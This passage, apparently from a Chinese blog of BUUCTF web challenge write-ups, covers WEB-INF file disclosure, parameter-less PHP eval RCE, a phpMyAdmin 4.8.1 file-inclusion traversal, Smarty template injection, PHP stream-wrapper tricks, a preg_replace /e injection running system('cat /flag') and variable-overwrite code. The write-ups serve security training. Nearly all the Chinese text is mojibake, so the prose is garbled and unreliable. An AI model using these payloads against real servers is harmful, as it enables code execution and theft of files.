.jaræ–‡ä»¶ä¸­&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </code></pre><p>æ¼æ´æˆå› </p><pre class="language-txt" data-language="txt"><code class="language-txt">é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼</code></pre><p>æ¼æ´åˆ©ç”¨</p><pre class="language-txt" data-language="txt"><code class="language-txt">æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </code></pre><p>æ‰€ä»¥å…ˆè®¿é—®ä¸€ä¸‹WEB-INF/web.xml</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808125056946.png" alt="image-20210808125056946"></p><p>è¿™ä¸ªè·¯å¾„com.wm.ctf.IndexControlleråº”è¯¥å’Œflagæœ‰å…³</p><p>æ‰€ä»¥è¯•è¯•è®¿é—®ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131605144.png" alt="image-20210808131605144"></p><p>çœ‹åˆ°æœ‰å—ç±»ä¼¼base64</p><p>è§£ç å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131703878.png" alt="image-20210808131703878"></p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><a href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]ç¦æ­¢å¥—å¨ƒ_TzZzEZ-webçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]ç¦æ­¢å¥—å¨ƒ - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p><p>é¢˜ç›®å­˜åœ¨gitæ³„éœ²ï¼Œç”¨GitHackæ‰«ä¸€ä¸‹å¾—åˆ°æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808134953571.png" alt="image-20210808134953571"></p><p>å¯ä»¥çŒœåˆ°è¿™é‡Œåˆ©ç”¨äº†evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿</p><pre class="language-none"><code class="language-none">1.éœ€è¦ä»¥GETå½¢å¼ä¼ å…¥ä¸€ä¸ªåä¸ºexpçš„å‚æ•°ã€‚å¦‚æœæ»¡è¶³æ¡ä»¶ä¼šæ‰§è¡Œè¿™ä¸ªexpå‚æ•°çš„å†…å®¹ã€‚2.è¿‡æ»¤äº†å¸¸ç”¨çš„å‡ ä¸ªä¼ªåè®®ï¼Œä¸èƒ½ä»¥ä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚3.(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚4.æ­£åˆ™åŒ¹é…æ‰äº†et&#x2F;na&#x2F;infoç­‰å…³é”®å­—ï¼Œå¾ˆå¤šå‡½æ•°éƒ½ç”¨ä¸äº†ã€‚5ï¼ševal($_GET[&#39;exp&#39;]); å…¸å‹çš„æ— å‚æ•°RCE</code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">PHP Parametric Function RCE Â· sky&#39;s blog (skysec.top)</a>å…³äºæ— å‚æ•°rce</p><p>é¦–å…ˆè¦è¯»å–ç›®å½•å†…å®¹ï¼Œ</p><p>å¯ä»¥ç”¨print_r(scandir(&#39;.&#39;));</p><p>ä½†æ˜¯å› ä¸ºä¸èƒ½ä¼ å‚ï¼Œæ‰€ä»¥è¦æƒ³æŠŠ.ç”¨å‡½æ•°ä»£æ›¿</p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨</p><pre class="language-none"><code class="language-none">localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</code></pre><p>æ‰€ä»¥current(localeconv())æ°¸è¿œæ˜¯ä¸ª.</p><p>ä¹Ÿå°±å¯ä»¥ç”¨print_r(scandir(current(localeconv())));æ¥è¯»ç›®å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808142444979.png" alt="image-20210808142444979"></p><p>å¯ä»¥çœ‹åˆ°flagå°±åœ¨flag.phpä¸­</p><p>ç°åœ¨è¦æƒ³åŠæ³•æŠŠå®ƒè¯»å‡ºæ¥</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨array_reverse()å’Œnextå‡½æ•°</p><p>é€šè¿‡array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br>ï¼ˆåè½¬ä¹‹åflag.phpè¢«æ”¾åœ¨ç¬¬äºŒä¸ªæ•°ç»„ä¹‹ä¸­ï¼‰<br>next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>payloadä¸ºï¼š</p><pre class="language-php" data-language="php"><code class="language-php">ï¼Ÿexp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144017189.png" alt="image-20210808144017189"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨</p><p>array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p><p>array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p><p>æœ€åå†åˆ©ç”¨readfileå‡½æ•°è¯»å‡ºæ–‡ä»¶æˆ–è€…ç”¨show_sourceè®©å®ƒé«˜äº®æ˜¾ç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144253823.png" alt="image-20210808144253823"></p><p>ç”±äºarray_randæ˜¯éšæœºçš„ï¼Œæ‰€ä»¥è¦å¤šåˆ·æ–°å‡ æ¬¡æ‰å¯èƒ½ä¼šæ˜¾ç¤ºflag.phpçš„å†…å®¹</p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>å¾¡å‰‘æ˜¯çœŸçš„ä¸å¥½ç”¨ã€‚ã€‚ã€‚phpmyadminè·¯å¾„æ­»æ´»æ‰«ä¸å‡ºæ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808154118587.png" alt="image-20210808154118587"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150229023.png" alt="image-20210808150229023"></p><p>è¿™é‡Œphpmyadminç‰ˆæœ¬æ˜¯4.8.1</p><p>ç”±äºphpmyadmin4.8.0-4.8.1å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ç›´æ¥ç”¨payloadæ‰“</p><p>?target=db_datadict.php%253f/../../../../../../../../flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150605205.png" alt="image-20210808150605205"></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>è¿™é“é¢˜ç¬¬ä¸€çœ¼çœ‹ä¸Šå»åƒæ˜¯æœ¬åœ°è®¿é—®çš„é¢˜ç›®</p><p>ä½†æ˜¯hintæœ‰æ„Ÿè§‰ä¸å¤ªåƒ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808201950916.png" alt="image-20210808201950916"></p><p>æŠ“åŒ…ä¿®æ”¹xffå¤´åå°±æ²¡æ€è·¯äº†ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯smartyæ¨¡æ¿æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202158856.png" alt="image-20210808202158856"></p><p>çœ‹åˆ°è¿™é‡Œæ”¯æŒé€»è¾‘è¿ç®—ï¼Œå¯ä»¥ç›´æ¥è§£æï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨ç³»ç»Ÿå‘½ä»¤æ¥è¯»flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202307003.png" alt="image-20210808202307003"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202546370.png" alt="image-20210808202546370"></p><p><strong>Smarty SSTIåˆ©ç”¨</strong></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">(1æ¡æ¶ˆæ¯) PHPçš„æ¨¡æ¿æ³¨å…¥ï¼ˆSmartyæ¨¡æ¿ï¼‰_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_smartyæ¨¡æ¿æ³¨å…¥</a></p><p>Smartyæ˜¯åŸºäºPHPå¼€å‘çš„ï¼Œå¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚</p><p><strong>æ¼æ´ç¡®è®¤</strong></p><p>ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202952019.png" alt="image-20210808202952019"></p><p><strong>å¸¸è§„åˆ©ç”¨æ–¹å¼</strong></p><p>Smartyæ”¯æŒä½¿ç”¨<code>&#123;php&#125;&#123;/php&#125;</code>æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚</p><p><strong>{literal} æ ‡ç­¾</strong></p><blockquote><p><strong><code>&#123;literal&#125;</code>å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚</strong> è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</p></blockquote><p>è‹¥è¯¥é¢˜ç¯å¢ƒä¸ºphp5ï¼Œåˆ™å¯ä»¥</p><pre class="language-none"><code class="language-none">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</code></pre><p><strong>é™æ€æ–¹æ³•</strong></p><p>é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™è¢«ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡‡ç”¨ã€‚</p><p><strong>åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤</strong></p><p><strong>{if}æ ‡ç­¾</strong><br>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p><p>Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š{if is_array($array)}{/if}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808203333956.png" alt="image-20210808203333956"></p><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>ç¬¬ä¸€éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809002920929.png" alt="image-20210809002920929"></p><p>å¯ä»¥ç”¨ä¼ªåè®®è¯»å–ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç”¨hackbaræ—¶æ²¡æˆåŠŸ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225403216.png" alt="image-20210808225403216"></p><p>ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªpayload</p><pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>base64è§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225453870.png" alt="image-20210808225453870"></p><p>å½“patternä¼ å…¥çš„æ­£åˆ™è¡¨è¾¾å¼å¸¦æœ‰/eæ—¶ï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå³å½“åŒ¹é…åˆ°ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å¯è¢«å½“åšä»£ç æ¥æ‰§è¡Œã€‚æ€è·¯æ˜¯åˆ©ç”¨è¿™ä¸ªä»£ç æ‰§è¡Œï¼Œæ‰§è¡Œæºç ä¸­çš„getFlag()å‡½æ•°ï¼Œåœ¨ä¼ å…¥cmdå‚æ•°ï¼Œå†åˆ©ç”¨getFlagä¸­çš„evalï¼ˆï¼‰å‡½æ•°ï¼Œå†è¿›è¡Œä¸€ä¸ªä»£ç æ‰§è¡Œã€‚</p><p><a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œç¬¬äºŒä¸ªå‚æ•°å›ºå®šä¸º<code>strtolower(&quot;\\1&quot;)</code>è¿™é‡Œçš„<code>\\1</code>å®é™…ä¸Šä½“ç°ä¸º<code>\1</code></p><p> <strong>\1</strong> åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰:</p><p><strong>åå‘å¼•ç”¨</strong><br>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®</p><p>è¿™é‡Œçš„\1æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</p><p>è¿™é‡Œæˆ‘ä»¬å°±è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥è¿è¡Œgetflagå‡½æ•°ï¼Œå¹¶åŒæ—¶ç»™cmdä¼ å‚ï¼Œåˆ©ç”¨systemæ¥æ‰§è¡Œå‘½ä»¤</p><p>ä¸ºäº†å®ç°è¿è¡Œgetflagçš„ç›®çš„ï¼Œå°±è¦å…ˆè®©\1ä¸ºgetflag(),ä¹Ÿå°±æ˜¯ä¼ å…¥</p><p> .*={${getFlag()}}</p><pre class="language-none"><code class="language-none">åŸå…ˆçš„è¯­å¥ï¼š preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);å˜æˆäº†è¯­å¥ï¼š preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;);</code></pre><p>è¿™æ ·é€šè¿‡preg_replaceåå°±ä¼šè¿è¡Œgetflagå‡½æ•°ï¼Œä½†æ˜¯ç”±äºphpç‰¹æ€§.ä¼ å…¥åä¼šå˜ä¸º_æ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨æ­£åˆ™åŒ¹é…ä¸­çš„\S</p><p>æ‰€ä»¥ä¼ å…¥çš„payloadä¸º\S*={${getFlag()}}</p><pre class="language-none"><code class="language-none">\S åœ¨phpæ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåŒ¹é…æ‰€æœ‰éç©ºå­—ç¬¦ï¼Œ*è¡¨ç¤ºå¤šæ¬¡åŒ¹é…</code></pre><p>æœ€ç»ˆpayloadä¸º?\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;);</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809001841771.png" alt="image-20210809001841771"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>æ•´åäº†çŸ¥é“æ˜¯gitæ³„éœ²ä½†æ˜¯ç”¨githackæ‰«å®Œä¹‹åå°±æ˜¯æ²¡æœ‰æºç ã€‚ã€‚ã€‚</p><p>å€Ÿä¸€ä¸‹ç™¾åº¦çš„wpçš„æºç </p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;flag.php&#39;;$yds &#x3D; &quot;dog&quot;;$is &#x3D; &quot;cat&quot;;$handsome &#x3D; &#39;yds&#39;;foreach($_POST as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $$y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    exit($yds);&#125;if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>flag.php</p><pre class="language-none"><code class="language-none">&lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</code></pre><p>å‰ä¸¤ä¸ª<code>foreach</code>è¯­å¥åˆ†åˆ«å°†<code>POST</code>å‚æ•°å’Œ<code>GET</code>å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæ¥ç€æ˜¯ä¸‰ä¸ªifè¯­å¥ï¼Œ<code>exit()</code>å‡½æ•°é€€å‡ºè„šæœ¬çš„åŒæ—¶è¾“å‡ºå˜é‡ï¼Œæœ€åä¸€å¥æ˜¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„flagã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯è®©è„šæœ¬æ‰§è¡Œåˆ°æœ€åä¸€å¥<code>echo $flag;</code>ï¼Œä½†å³ä½¿ç»•è¿‡ä¸‰ä¸ªifè¯­å¥ï¼Œæˆ‘ä»¬<code>GET</code>ä¼ å‚æˆ–è€…<code>POST</code>ä¼ å‚çš„flagæ€»ä¼šè¢«å˜é‡è¦†ç›–ï¼šå¦‚æˆ‘ä»¬<code>GET</code>ä¼ å‚flag=aaaï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­å˜æˆ<code>$flag</code> = <code>$aaa</code>ï¼Œè€Œ<code>$aaa</code>å˜é‡æ²¡æœ‰å®šä¹‰ä¸ºç©ºï¼Œæœ€åçš„è¾“å‡ºå°±æ˜¯ç©º</p><p>ä½†æ˜¯ç”±äºå˜é‡è¦†ç›–çš„åŸå› æœ€ç»ˆä¸ä¼šæ˜¾ç¤ºflag</p><p>è€Œ<code>exit()</code>å‡½æ•°è™½ç„¶ä¼šé€€å‡ºæ‰§è¡Œï¼Œä½†ä¹Ÿä¼šè¾“å‡ºå…¶å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–å°†<code>exit()</code>å‡½æ•°å†…çš„å‚æ•°ç”¨<code>$flag</code>è¦†ç›–æ‰å°±èƒ½è¾“å‡ºflagäº†ï¼›</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©åä¸¤ä¸ªifè¯­å¥ä¸­çš„exitæ¥è¾“å‡ºflag</p><p>å½“æˆ‘ä»¬get yds=flagæ—¶ï¼Œæ»¡è¶³ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œè€Œç”±äºç¬¬ä¸€ä¸ªforeachè¯­å¥ï¼Œ$yds=$flagï¼Œæ‰€ä»¥æœ€ç»ˆå°±ä¼šå˜æˆexit($flag);</p><p>è¿˜å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œå½“æˆ‘ä»¬get flag=flag&amp;is=flagåç»è¿‡ç¬¬äºŒä¸ªforeachè¯­å¥$flag=$flagï¼Œ$is=$flagå¯¹flagè‡ªèº«æ— å½±å“ï¼Œåˆå› ä¸ºæ»¡è¶³ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œä¹Ÿä¼šè¾“å‡ºflagå€¼</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/113790063?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BJDCTF2020]Mark loves cat (ä¸¤ç§è§£æ³•)ï¼ˆå˜é‡è¦†ç›–æ¼æ´ï¼‰_Zero_Adamçš„åšå®¢-CSDNåšå®¢</a></p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves 